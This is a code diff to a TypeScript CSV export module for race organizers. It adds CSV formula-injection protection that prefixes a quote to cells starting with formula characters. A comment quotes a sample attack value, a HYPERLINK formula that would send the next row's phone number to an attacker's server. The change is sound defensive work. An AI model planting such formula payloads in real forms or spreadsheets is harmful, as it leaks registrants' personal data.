@@ -6,7 +6,7 @@
  * this file is what an organizer's race-day spreadsheet actually is, and
  * adding a column should not mean opening the table.
  *
- * Three things had to be true and were not:
+ * Four things had to be true and were not:
  *
  *  - **Every field is quoted.** Only some of them used to be, so a runner
  *    named "DELA CRUZ, JR." or a category called "10K, Open" pushed every
@@ -17,6 +17,10 @@
  *    the number 639171234567 with the plus gone. The `="…"` form is the one
  *    spelling Excel, Google Sheets and LibreOffice all read back as the
  *    literal string.
+ *  - **No runner-typed text runs as a formula.** `csvField` neutralizes any
+ *    value opening with `=`, `+`, `-`, `@`, tab or CR with a leading `'`
+ *    (see `FORMULA_START`). Every text cell goes through it, so a new column
+ *    is safe by default; the phone columns are `csvPhone`'s string literal.
  *  - **A UTF-8 BOM leads the file.** Without it Excel opens a UTF-8 CSV as
  *    the system codepage, and the first "Ñ" in a Filipino name arrives as
  *    mojibake.
@@ -28,9 +32,32 @@
 import { formatPesos } from '@/lib/money';
 import type { UnpaidCheckout } from './UnpaidCheckoutsList';
 
-/** One quoted field. Shared with the client's runner list (`your-events/[id]/runner-csv.ts`). */
-export const csvField = (value: unknown): string =>
-  `"${String(value ?? '').replace(/"/g, '""')}"`;
+/**
+ * A cell a spreadsheet would run as a formula: Excel, Google Sheets and
+ * LibreOffice all evaluate one that opens with `=`, `+`, `-` or `@`, and
+ * Excel skips a leading tab or carriage return to find one. RFC 4180 quoting
+ * does not stop it — the quotes are stripped before the cell is read.
+ */
+const FORMULA_START = /^[=+\-@\t\r]/;
+
+/**
+ * One quoted field, never a formula. Shared with the client's runner list
+ * (`your-events/[id]/runner-csv.ts`).
+ *
+ * Names, addresses and medical notes are typed by the public, and only
+ * trimmed and uppercased on the way in (`text-case.ts`), so a runner can
+ * register as `=HYPERLINK("https://…?"&G2,"CLICK")` and have the sheet post
+ * the next row's phone to their server when an organizer — or, since the
+ * client runner list, a client — opens it. A value that would start a formula
+ * gets a leading `'` inside the quotes (OWASP's fix), so it reads as the text
+ * it is. A lone `-`, the placeholder runners type for "none", is let through
+ * bare: on its own it is not a formula in any of the three.
+ */
+export const csvField = (value: unknown): string => {
+  const text = String(value ?? '');
+  const safe = FORMULA_START.test(text) && text !== '-' ? `'${text}` : text;
+  return `"${safe.replace(/"/g, '""')}"`;
+};
 
 /** A phone number Excel keeps as text, leading `+` and all. */
 export const csvPhone = (value: unknown): string => {
